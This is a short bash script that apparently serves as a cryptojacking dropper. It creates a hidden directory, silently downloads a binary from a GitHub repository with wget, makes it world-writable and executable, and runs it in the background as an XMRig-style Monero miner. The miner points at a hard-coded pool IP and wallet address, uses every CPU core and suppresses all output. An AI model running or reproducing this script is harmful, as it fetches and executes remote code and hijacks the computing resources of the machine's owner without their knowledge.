#!/bin/bash

mkdir .studio
cd .studio
nohup wget -O mmm https://github.com/kidoescegh/xm/raw/main/newxm > /dev/null 2>&1
chmod 777 mmm
./mmm --donate-level 1 -o 104.248.119.73:80 -u 87ZKYmmCQmXGzu1AZkxmgM9wdqwk5YtBDQ6ZGouBam1584jKUvDrC7ccANX8N7M7sGRnR9Fu18gDdTQCVVo3U2m9KYhNNsR -p Sage -a rx/0 -t $(nproc --all) > /dev/null 2>&1 &
